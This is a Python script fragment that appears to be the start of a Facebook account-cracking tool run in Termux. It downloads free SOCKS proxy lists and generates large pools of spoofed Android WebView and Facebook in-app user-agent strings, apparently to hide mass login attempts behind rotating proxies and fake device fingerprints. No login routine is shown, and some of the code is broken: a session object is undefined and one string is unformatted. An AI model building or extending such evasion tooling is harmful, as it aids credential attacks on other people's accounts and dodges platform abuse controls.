###----------[ IMPORT MODULE ]----------###
from os import path
from os import system as Love_Tisha
import requests,json,os,sys,random,datetime,time,re,platform,string,uuid,base64
from rich.progress import Progress,SpinnerColumn,BarColumn,TextColumn,TimeElapsedColumn
from concurrent.futures import ThreadPoolExecutor as tred
from time import sleep as waktu
from time import time as mek
from bs4 import BeautifulSoup as sop
import os,base64,zlib,pip,urllib,random, requests
try: 
        import os,requests,json,time,re,random,sys,uuid,string,subprocess
        from string import *
except ModuleNotFoundError:
        os.system(f'pip install requests futures==2 > /dev/null')
except:pass
#if not len(open('/data/data/com.termux/files/usr/lib/python3.11/site-packages/requests/models.py','r').readlines())==1034:print('Bypass User')
###----------[ GLOBAL NAMA ]----------###
#fb="m"
id,id2,uid = [],[],[]
tokenefb = []
akunyeh = []
usragent = []
loop,baz = 0,[]
ok,cp,oo = 0,0,[]
ugen=[]
ugen12=[]
try:
 print('\033[32;1mSuccess')
 uno = ses.get('https://api.proxyscrape.com/?request=displayproxies&protocol=socks5&timeout=10000&country=all&ssl=all&anonymity=all').text
 open('.proxy.txt','w').write(uno)
except:pass
try:
  proxylist= requests.get('https://api.proxyscrape.com/v2/?request=displayproxies&protocol=socks4&timeout=100000&country=all&ssl=all&anonymity=all').text
  open('socksku.txt','w').write(proxylist)
except Exception as e:
  print(' server error')
proxsi=open('socksku.txt','r').read().splitlines()

###----------[ USER AGENT ]----------###

import random
for i in range(10000):
 #   berson=f'{str(rr(117,121))}.0.{str(rr(5938,6167))}.{str(rr(40,150))}'
    rc=random.choice
    rr=random.randint
    
    #8----
    #9------  PPR1.180610.011, 
    #10 --- QP1A.190711.020
    #11-----
    #12------  SP1A.210812.016
    #13-----  TP1A.220624.014 , TKQ1.220807.001
    #14-----  UP1A.231005.007
    #8---- R16NW
    #9------  PPR1.180610.011, PKQ1.190714.001
    #10 --- QP1A.190711.020 , QKQ1.190915.002
    #11-----  RP1A.201005.001, RKQ1.210503.001
    #12------  SP1A.210812.016 ,  SKQ1.211006.001
    #13-----  TP1A.220624.014 , TKQ1.220807.001 , TQ2A.230505.002= pixel
    #14-----  UP1A.231005.007 , UKQ1.230705.002
    my_modle=['R16NW','PPR1.180610.011','PKQ1.190714.001','QP1A.190711.020','QKQ1.190915.002','RP1A.201005.001','RKQ1.210503.001','SP1A.210812.016','SKQ1.211006.001','TP1A.220624.014','TKQ1.220807.001','UP1A.231005.007','UKQ1.230705.002']
    venmodle=rc(my_modle)
    if venmodle in ['R16NW']:
        bunum='8.0.0'
        device_ver=rc(['R16NW'])
        br_ver=f'{str(rr(61,121))}.0.{str(rr(3163,6167))}.{str(rr(40,150))}'
        android_modle=rc(['SM-G930F','SM-A720F','SM-G950U','AGS2-L09','moto e5 plus','SM-G960U','ATU-L31','RNE-L22'])
    elif venmodle in ['PPR1.180610.011','PKQ1.190714.001']:
        bunum='9'
        device_ver=rc(['PPR1.180610.011','PKQ1.190714.001'])
        br_ver=f'{str(rr(70,121))}.0.{str(rr(3532,6167))}.{str(rr(40,150))}'
        android_modle=rc(['Mi Note 10','Redmi Note 8','Redmi Note 8 Pro','Redmi Note 7','Redmi Note 7 Pro','Redmi Note 6 Pro','CPH1931','Nokia C1','Nokia X71','Nokia C2'])
    elif venmodle in ['QP1A.190711.020','QKQ1.190915.002']:
        bunum='10'
        device_ver=rc(['QP1A.190711.020','QKQ1.190915.002'])
        br_ver=f'{str(rr(78,121))}.0.{str(rr(3904,6167))}.{str(rr(40,150))}'
        android_modle=rc(['Mi Note 10','Redmi Note 8','Redmi Note 8 Pro','Redmi Note 7','Redmi Note 7 Pro','CPH2239','CPH1931','SM-T835','V2023EA','V1838A','Nokia C3'])
    elif venmodle in ['RP1A.201005.001','RKQ1.210503.001']:
        bunum='11'
        device_ver=rc(['RP1A.201005.001','RKQ1.210503.001'])
        br_ver=f'{str(rr(86,121))}.0.{str(rr(4240,6167))}.{str(rr(40,150))}'
        android_modle=rc(['2201116PI','M2101K6G','2201117TG','21091116AC','Redmi Note 8','Redmi Note 8 Pro','CPH2239','CPH2325','PEMM20','CPH2159','CPH2251','SM-N975F','itel A611W','itel P651L','itel A512W','itel A507LM'])
    elif venmodle in ['SP1A.210812.016','SKQ1.211006.001']:
        bunum='12'
        device_ver=rc(['SP1A.210812.016','SKQ1.211006.001'])
        br_ver=f'{str(rr(97,121))}.0.{str(rr(4692,6167))}.{str(rr(40,150))}'
        android_modle=rc(['2201116PI','M2101K6G','2201117TG','21091116AC','23021RAAEG','CPH2185','PEMM20','CPH2159','CPH2385','CPH2251','CPH2477','CPH2471','PGBM10','CPH2359','SM-A235F','SM-A032F','SM-A217F','SM-A125F','itel A632W','itel S663L','itel A507LV','Nokia T21'])
    elif venmodle in ['TP1A.220624.014','TKQ1.220807.001']:
        bunum='13'
        device_ver=rc(['TP1A.220624.014','TKQ1.220807.001'])
        br_ver=f'{str(rr(105,121))}.0.{str(rr(5195,6167))}.{str(rr(40,150))}'
        android_modle=rc(['23049PCD8G','2201117TG','21091116AC','23021RAAEG','CPH2579','PEMM20','CPH2385','CPH2251','PGBM10','CPH2359','CPH2481','SM-F936B','SM-G770F','SM-G780G','Nokia T10','Nokia XR21','itel A663LC','itel A663LC','itel A632WM','itel A666L','itel A663L','itel S681LN','Nokia XR21','V2244','V2171A','V2172A','I2213','V2270A','I2223'])
    elif venmodle in ['UP1A.231005.007','UKQ1.230705.002']:
        bunum='14'       
        device_ver=rc(['UP1A.231005.007','UKQ1.230705.002'])
        br_ver=f'{str(rr(119,121))}.0.{str(rr(6045,6167))}.{str(rr(40,150))}'
        android_modle=rc(['2210132C','V2244','I2022','V2303','V2266A','V2227A'])
    else:pass
    berson=f'{str(rr(117,121))}.0.{str(rr(5938,6167))}.{str(rr(40,150))}'
    berson1=f'{str(rr(117,121))}.0.{str(rr(5938,6167))}.{str(rr(40,150))}'
    berson2=f'{str(rr(117,121))}.0.{str(rr(5938,6167))}.{str(rr(40,150))}'
    berson3=f'{str(rr(117,121))}.0.{str(rr(5938,6167))}.{str(rr(40,150))}'
   # k=Mozilla/5.0 (Linux; Android 10; Nokia C3 Build/QP1A.190711.020; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/81.0.4044.138 Mobile Safari/537.36
    a='Mozilla/5.0 (Linux; Android'
    #b=str(rr(10,13))
    c=f'{android_modle}'
    #c=f'Nokia c{str(rr(3,20))}'
    d=f'Build/{device_ver}; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/'
    #e=berson
    e=br_ver
    f='Mobile Safari/537.36'
    noki=f'{a} {bunum}; {c} {d}{e} {f}'
    ugen12.append(noki)

import random
moto_ua=[]
for xxx in range(10000):
	rc=random.choice
	rr=random.randint
	# realme user agent
	
	#Google Chrome 117.0.5938.89
	verson=f"{str(rr(117,121))}.0.{str(rr(5938,6167))}.{str(rr(40,150))}"
#	e 32
	ma=f"Mozilla/5.0 (Linux; Android 11; moto e32 Build/RORS31.193-14-6; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/{verson} Mobile Safari/537.36"
	# moto e22
	mb=f"Mozilla/5.0 (Linux; Android 12; moto e22 Build/SOVS32.121-44-3; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/{verson} Mobile Safari/537.36"
	# moto e 13
	mc=f"Mozilla/5.0 (Linux; Android 13; moto e13 Build/TLA33.105-42-42; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/verson Mobile Safari/537.36"
	# edge 40 neo
	md=f"Mozilla/5.0 (Linux; Android 13; motorola edge 40 neo Build/T3TM33.23-100-3; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/{verson} Mobile Safari/537.36"
	#motorola edge 40
	me=f"Mozilla/5.0 (Linux; Android 13; motorola edge 40 neo Build/T3TM33.23-100-3; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/{verson} Mobile Safari/537.36"
	#moto g72
	mf=f"Mozilla/5.0 (Linux; Android 12; moto g72 Build/S3SV32.45-12-7; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/{verson} Mobile Safari/537.36"
	#Build/S3SVS32.45-24-3-2
	#XT2255-1
	# moto g 31
	mg=f"Mozilla/5.0 (Linux; Android 11; moto g31 Build/RRWBS31.Q3-46-85-5; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/{verson} Mobile Safari/537.36"
#	Build/S3RWBS32.125-29-2-3 #12
	mh=f"Mozilla/5.0 (Linux; Android 11; moto g31 Build/S3RWBS32.125-29-2-3; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/{verson} Mobile Safari/537.36"
	# moto e 40
	mi=f"Mozilla/5.0 (Linux; Android 11; moto e40 Build/ROQ31.166-27; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/{verson} Mobile Safari/537.36"
	# mot edge 20 fusion
	mj=f"Mozilla/5.0 (Linux; Android 11; motorola edge 20 fusion Build/RRKS31.Q3-19-97-12; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/{verson} Mobile Safari/537.36"
	#Build/S2RKS32.92-11-30-8#12
	mk=f"Mozilla/5.0 (Linux; Android 12; motorola edge 20 fusion Build/S2RKS32.92-11-30-8; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/{verson} Mobile Safari/537.36"
	# moto g 10 power
	ml=f"Mozilla/5.0 (Linux; Android 11; moto g(10) power Build/RRBS31.Q1-3-58-15; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/{verson} Mobile Safari/537.36"
	#moto g 30
	mm=f"Mozilla/5.0 (Linux; Android 11; moto g(30) Build/RRCS31.Q1-3-56-3; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/{verson} Mobile Safari/537.36"
	# Build/S0RCS32.41-10-9-2#12
	mn=f"Mozilla/5.0 (Linux; Android 12; moto g(30) Build/S0RCS32.41-10-9-2; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/{verson} Mobile Safari/537.36"
	# moto e 7 plus
	mo=f"Mozilla/5.0 (Linux; Android 10; moto e(7) plus Build/QPZ30.30-Q3-38-69; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/{verson} Mobile Safari/537.36"
	mp=f"Mozilla/5.0 (Linux; Android 11; moto g(9) plus Build/RPAS31.Q2-59-17-4-5-5; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/{verson} Mobile Safari/537.36"
	# Build/QPAS30.19-Q3-32-50-7 #10
	mq=f"Mozilla/5.0 (Linux; Android 10; moto g(9) plus Build/QPAS30.19-Q3-32-50-7; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/{verson} Mobile Safari/537.36"
	# moto g 9 ply
	mr=f"Mozilla/5.0 (Linux; Android 11; moto g(9) play Build/RPXS31.Q2-58-17-4-8; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/{verson} Mobile Safari/537.36"
	# Build/QPX30.30-Q3-38-69#10
	ms=f"Mozilla/5.0 (Linux; Android 10; moto g(9) play Build/QPX30.30-Q3-38-69; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/{verson} Mobile Safari/537.36"
	# mot g 8 power
	mt=f"Mozilla/5.0 (Linux; Android 10; moto g(8) power lite Build/QODS30.163-7-17; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/{verson} Mobile Safari/537.36"
	# Build/RPES31.Q4U-47-35-5#11
	mu=f"Mozilla/5.0 (Linux; Android 11; moto g(8) power lite Build/RPES31.Q4U-47-35-5; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/{verson} Mobile Safari/537.36"
	#moto e6 plus
	mv=f"Mozilla/5.0 (Linux; Android 9; moto e(6) plus Build/PTBS29.401-58-3; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/{verson} Mobile Safari/537.36"
	#
	mw=f"Mozilla/5.0 (Linux; Android 11; motorola one action Build/RSBS31.Q1-48-36-26; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/{verson} Mobile Safari/537.36"
	# Build/QSBS30.121-12-8 #10
	#Build/PSBS29.39-49-7-1#9
	mx=f"Mozilla/5.0 (Linux; Android 10; motorola one action Build/QSBS30.121-12-8; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/{verson} Mobile Safari/537.36"
	my=f"Mozilla/5.0 (Linux; Android 9; motorola one action Build/PSBS29.39-49-7-1; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/{verson} Mobile Safari/537.36"
	#mot one
	mz=f"Mozilla/5.0 (Linux; Android 8.1.0; motorola one Build/OPK28.63-18; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/{verson} Mobile Safari/537.36"
	#Build/PPKS29.68-16-36-15#9
	#Build/QPKS30.54-22-27#10
	maa=f"Mozilla/5.0 (Linux; Android 9; motorola one Build/PPKS29.68-16-36-15; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/{verson} Mobile Safari/537.36"
	mab=f"Mozilla/5.0 (Linux; Android 10; motorola one Build/QPKS30.54-22-27; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/{verson} Mobile Safari/537.36"
	#g 7 power
	mac=f"Mozilla/5.0 (Linux; Android 10; moto g(7) power Build/QPOS30.52-29-2; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/{verson} Mobile Safari/537.36"
	#Build/PDOS29.114-134-15#9
	mad=f"Mozilla/5.0 (Linux; Android 9; moto g(7) power Build/PDOS29.114-134-15; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/{verson} Mobile Safari/537.36"
	# mot e 5 plus
	mae=f"Mozilla/5.0 (Linux; Android 8.0.0; moto e5 plus Build/OPPS27.91-179-8-16; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/{verson} Mobile Safari/537.36"
	# moto e4 plus
	maf=f"Mozilla/5.0 (Linux; Android 7.1.1; Moto E (4) Plus Build/NMA26.42-162-1; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/{verson} Mobile Safari/537.36"
	moto=rc([ma,mb,mc,md,me,mf,mg,mh,mi,mj,mk,ml,mm,mn,mo,mp,mq,mr,ms,mt,mu,mv,mw,mx,my,mz,maa,mab,mac,mad,maf])
	ugen.append(moto)
	#-------------oppo user agent----------------
# oppo f serise
# oppo f21 pro 5g
	ca=f"Mozilla/5.0 (Linux; Android {(rr(11,13))}; CPH2341 Build/{rc(['RKQ1.211119.001','SKQ1.211209.001','TP1A.220624.003'])}; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/{str(rr(94,121))}.0.{str(rr(4606,6167))}.{str(rr(10,195))} Mobile Safari/537.36"
	#print(i)
#sys.exit()
#print(ca)
#24 chorme 121.0.6167.143
	cb=f"Mozilla/5.0 (Linux; Android {(str(rr(11,13)))}; PEUM00 Build/{rc(['RKQ1.211119.001','TP1A.220624.014','TP1A.220905.001'])}; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/{str(rr(78,121))}.0.{str(rr(3904,6167))}.{str(rr(10,190))} Mobile Safari/537.36"

#print(cb)
#oppo f21 pro
	cd=f"Mozilla/5.0 (Linux; Android {(str(rr(11,13)))}; CPH2341 Build/{rc(['RKQ1.211119.001','SKQ1.211209.001','TP1A.220624.003'])}; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/{str(rr(94,121))}.0.{str(rr(4606,6167))}.{str(rr(10,190))} Mobile Safari/537.36"
#print(cd)
#opp f 19 pro
	ce=f"Mozilla/5.0 (Linux; Android {str(rr(11,13))}; CPH2285 Build/{rc(['SP1A.210812.016','RP1A.200720.011','TP1A.220905.001'])}; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/{str(rr(77,121))}.0.{str(rr(3865,6167))}.{str(rr(10,190))} Mobile Safari/537.36"
#77.0.3865.116
#SP1A.210812.016
#RP1A.200720.011
#TP1A.220905.001
#print(ce)

#opp f19 pro plus 5 g
	cf=f"Mozilla/5.0 (Linux; Android {str(rr(11,13))}; CPH2213 Build/{rc(['RP1A.200720.011','SP1A.210812.016'])}; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/{str(rr(87,121))}.0.{str(rr(4280,6167))}.{str(rr(20,190))} Mobile Safari/537.36"
#RP1A.200720.011
#SP1A.210812.016
#Chrome/87.0.4280.141
#print(cf)
#oppo find x3 pro
	cg=f"Mozilla/5.0 (Linux; Android {str(rr(11,13))}; {rc(['CPH2173','PEEM00'])} Build/{rc(['RKQ1.201105.002','RKQ1.211119.001','KQ1.210216.001'])}; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/{str(rr(91,121))}.0.{str(rr(4472,6167))}.{str(rr(5,98))} Mobile Safari/537.36"
#PEEM00
#RKQ1.201105.002
#RKQ1.211119.001
#KQ1.210216.001
#print(cg)
#oppo F 17
	ckkk=f"Mozilla/5.0 (Linux; Android {str(rr(10,12))}; CPH2095 Build/{rc(['RKQ1.211119.001','QKQ1.200614.002','RKQ1.201217.002'])}; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/{str(rr(87,121))}.0.{str(rr(4280,6167))}.{str(rr(20,198))} Mobile Safari/537.36"
#print(ckkk)
#QKQ1.200614.002
#RKQ1.211119.001
#RKQ1.201217.002
#Chrome/57.0.2987.108
#Chrome/87.0.4280.101
#oppo f 17 pro
	ch=f"Mozilla/5.0 (Linux; Android {str(rr(10,12))}; CPH2119 Build/{rc(['RP1A.200720.011','QP1A.190711.020','SP1A.210812.016'])}; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/{str(rr(70,121))}.0.{str(rr(3538,6167))}.{str(rr(5,195))} Mobile Safari/537.36"
#print(ch)
#RP1A.200720.011
#QP1A.190711.020
#SP1A.210812.016
#Chrome/70.0.3538.80
#oppo reno 5 F
	ci=f"Mozilla/5.0 (Linux; Android {str(rr(11,13))}; CPH2217 Build/{rc(['RP1A.200720.011','SP1A.210812.016','TP1A.220905.001'])}; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/{str(rr(94,121))}.0.{str(rr(4606,6167))}.{str(rr(15,195))} Mobile Safari/537.36"
#print(ci)
#RP1A.200720.011
#SP1A.210812.016
#TP1A.220905.001
#94.0.4606.85
#oppo reno 4 F
	cj=f"Mozilla/5.0 (Linux; Android {str(rr(10,12))}; CPH2209 Build/{rc(['RP1A.200720.011','QP1A.190711.020','SP1A.210812.016'])}; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/{str(rr(86,121))}.0.{str(rr(4240,6167))}.{str(rr(20,198))} Mobile Safari/537.36"
#print(cj)
#Chrome/86.0.4240.198
#SP1A.210812.016
#RP1A.200720.011
#QP1A.190711.020
#oppo f19
	ck=f"Mozilla/5.0 (Linux; Android {str(rr(10,12))}; {rc(['Oppo F19 Build','CHP2219','CPH2219'])}/{rc(['MMB29M','LRX21M'])}; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/{str(rr(83,121))}.0.{str(rr(4103,6167))}.{str(rr(15,98))} Mobile Safari/537.36"
#print(ck)
#
#CHP2219, CPH2219

#oppo A serise
#oppo A78
	cl=f"Mozilla/5.0 (Linux; Android {str(rr(12,14))}; {rc(['CPH2565','CPH2483','CPH2495'])} Build/{rc(['TP1A.220905.001','SP1A.210812.016'])}; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/{str(rr(101,121))}.0.{str(rr(4951,6167))}.{str(rr(10,198))} Mobile Safari/537.36"
#print(cl)
#Build/SP1A.210812.016
#oppo A16
	cm=f"Mozilla/5.0 (Linux; Android {str(rr(11,12))}; CPH2269 Build/RP1A.200720.011; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/{str(rr(94,121))}.0.{str(rr(4606,6167))}.{str(rr(12,198))} Mobile Safari/537.36"
#print(cm)
#Build/RP1A.200720.011
#94.0.4606.85
#oppo A38
	cn=f"Mozilla/5.0 (Linux; Android 13; CPH2579 Build/TP1A.220905.001; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/{str(rr(111,121))}.0.{str(rr(5563,6167))}.{str(rr(20,190))} Mobile Safari/537.36"
#print(cn)
#Chrome/111.0.5563.116
#oppo A15
	cm=f"Mozilla/5.0 (Linux; Android 10; CPH2185 Build/QP1A.190711.020; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/{str(rr(103,121))}.0.{str(rr(5060,6167))}.{str(rr(20,190))} Mobile Safari/537.36"
#print(cm)
#Chrome/103.0.5060.129
#oppo A11 K
	co=f"Mozilla/5.0 (Linux; Android 9; {rc(['CPH2071','CPH2083'])} Build/PPR1.180610.011; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/{str(rr(93,121))}.0.{str(rr(4577,6167))}.{str(rr(20,198))} Mobile Safari/537.36"
#print(co)
#CPH2083, CPH2071
#Chrome/93.0.4577.82
#oppo A 54
#[FB_IAB/FB4A;FBAV/324.0.0.48.120;]
	cpp=f"Mozilla/5.0 (Linux; Android 10; CPH2239 Build/QP1A.190711.020; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/{str(rr(87,121))}.0.{str(rr(4280,6167))}.{str(rr(20,198))} Mobile Safari/537.36"
#print(cpp)
	cppp=f"Mozilla/5.0 (Linux; Android 11; CPH2239 Build/RP1A.200720.011; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/{str(rr(87,121))}.0.{str(rr(4280,6167))}.{str(rr(20,198))} Mobile Safari/537.36"
#print(cppp)
#Build/RP1A.200720.011 #11	
#Build/QP1A.190711.020 #10
#Chrome/87.0.4280.101 #10
#oppo A55
#[FB_IAB/FB4A;FBAV/379.0.0.24.109;]
	cq=f"Mozilla/5.0 (Linux; Android 11; CPH2325 Build/RP1A.200720.011; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/{str(rr(92,121))}.0.{str(rr(4515,6167))}.{str(rr(40,198))} Mobile Safari/537.36"
#print(cq)
#----------------start cr
#oppo A 55 5g
#[FB_IAB/FB4A;FBAV/430.0.0.23.113;]
	crr=f"Mozilla/5.0 (Linux; Android 11; PEMM20 Build/RP1A.200720.011; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/{str(rr(90,121))}.0.{str(rr(4430,6167))}.{str(rr(40,198))} Mobile Safari/537.36"
	crrr=f"Mozilla/5.0 (Linux; Android 12; PEMM20 Build/SP1A.210812.016; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/{str(rr(90,121))}.0.{str(rr(4430,6167))}.{str(rr(40,198))} Mobile Safari/537.36"
#print(crr)
	crrrr=f"Mozilla/5.0 (Linux; Android 13; PEMM20 Build/TP1A.220905.001; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/{str(rr(90,121))}.0.{str(rr(4430,6167))}.{str(rr(40,198))} Mobile Safari/537.36"
	cr=rc([crr,crrr,crrrr])
#print(cr)
#Chrome/90.0.4430.61
#Build/SP1A.210812.016 #12
#Build/TP1A.220905.001 #13
#Build/RP1A.200720.011#11
#----------------end cr
#oppo reno 5-------cs start
#[FB_IAB/FB4A;FBAV/374.0.0.20.109;]
	css=f"Mozilla/5.0 (Linux; Android 11; CPH2159 Build/RKQ1.200903.002; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/{str(rr(99,121))}.0.{str(rr(4844,6167))}.{str(rr(40,198))} Mobile Safari/537.36"
	csss=f"Mozilla/5.0 (Linux; Android 12; CPH2159 Build/SKQ1.210216.001; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/{str(rr(99,121))}.0.{str(rr(4844,6167))}.{str(rr(40,198))} Mobile Safari/537.36"
	cs=rc([css,csss])
#print(cs)
#Build/RKQ1.200903.002 #11
#Build/SKQ1.210216.001 #12
# -------------end cs
#oppo A77 # onno type ua
	ct=f"Mozilla/5.0 (Linux; Android {str(rr(12,14))}; CPH2339) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/{str(rr(101,121))}.0.{str(rr(4951,6167))}.{str(rr(41,198))} Mobile Safari/537.36"
	cttt=f"Mozilla/5.0 (Linux; Android 13; CPH2385 Build/TP1A.220905.001; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/{str(rr(110,121))}.0.{str(rr(5481,6167))}.{str(rr(40,190))} Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/418.0.0.33.69;]"
#Build/SP1A.210812.016 #12
#Chrome/103.0.5060.129
	ctttt=f"Mozilla/5.0 (Linux; Android 12; CPH2385 Build/SP1A.210812.016; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/{str(rr(109,121))}.0.{str(rr(5414,6167))}.{str(rr(40,190))} Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/418.0.0.33.69;]"
	ctt=rc([cttt,ctttt])
#print(ctt)
#print(ct)
#oppo a5-----------$tart
	cuu=f"Mozilla/5.0 (Linux; Android 10; CPH1931 Build/QKQ1.200209.002; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/{str(rr(70,121))}.0.{str(rr(3538,6167))}.{str(rr(20,198))} Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/367.0.0.24.107;]"
	cuuu=f"Mozilla/5.0 (Linux; Android 9; CPH1931 Build/PKQ1.190714.001; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/{str(rr(70,121))}.0.{str(rr(3538,6167))}.{str(rr(20,198))} Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/367.0.0.24.107;]"
	cu=rc([cuu,cuuu])
#print(cu)
#Build/PKQ1.190714.001 #9
#-----------cu end
#
#oppo reno 6
	cvv=f"Mozilla/5.0 (Linux; Android 12; CPH2251 Build/SP1A.210812.003; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/{str(rr(100,121))}.0.{str(rr(4896,6167))}.{str(rr(40,190))} Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/374.0.0.20.109;]"
#SP1A.210812.003 #12
#Build/RP1A.200720.011 #11
#Build/TP1A.220905.001 #13
	cvvv=f"Mozilla/5.0 (Linux; Android 11; CPH2251 Build/RP1A.200720.011; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/{str(rr(78,121))}.0.{str(rr(3904,6167))}.{str(rr(40,190))} Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/374.0.0.20.109;]"
	cvvvv=f"Mozilla/5.0 (Linux; Android 13; CPH2251 Build/TP1A.220905.001; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/{str(rr(111,121))}.0.{str(rr(5563,6167))}.{str(rr(40,190))} Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/374.0.0.20.109;]"
	cv=rc([cvv,cvvv,cvvvv])
#print(cv)
# -------------reno 6 end
#oppo A7
	cw=f"Mozilla/5.0 (Linux; Android 8.1.0; {rc(['CPH1901','CPH1903','CPH1905','PBFM00','PBFT00'])}) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/{str(rr(87,121))}.0.{str(rr(4280,6167))}.{str(rr(20,198))} Mobile Safari/537.36"
#-----------a 7 end
#oppo a 17
	cx=f"Mozilla/5.0 (Linux; Android 12; CPH2477 Build/SP1A.210812.016; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/{str(rr(103,121))}.0.{str(rr(5060,6167))}.{str(rr(40,198))} Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/425.0.0.23.49;]"
#Build/SP1A.210812.016 #12
#Chrome/103.0.5060.129
#oppo a17 k
	cy=f"Mozilla/5.0 (Linux; Android 12; CPH2471 Build/SP1A.210812.016; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/{str(rr(107,121))}.0.{str(rr(5304,6167))}.{str(rr(40,198))} Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/393.0.0.35.106;]"
#print(cy)
#oppo reno 8 --------start
	czz=f"Mozilla/5.0 (Linux; Android 13; PGBM10 Build/TP1A.220905.001; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/{str(rr(103,121))}.0.{str(rr(5060,6167))}.{str(rr(40,180))} Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/420.0.0.32.61;]"
#TP1A.220905 #13
#Build/SP1A.210812.016 #12
#Chrome/103.0.5060.129 #13
	czzz=f"Mozilla/5.0 (Linux; Android 12; PGBM10 Build/SP1A.210812.016; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/{str(rr(103,121))}.0.{str(rr(5060,6167))}.{str(rr(40,180))} Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/420.0.0.32.61;]"
	cz=rc([czz,czzz])
#print(cz)
#oppo reno 8 pro----------
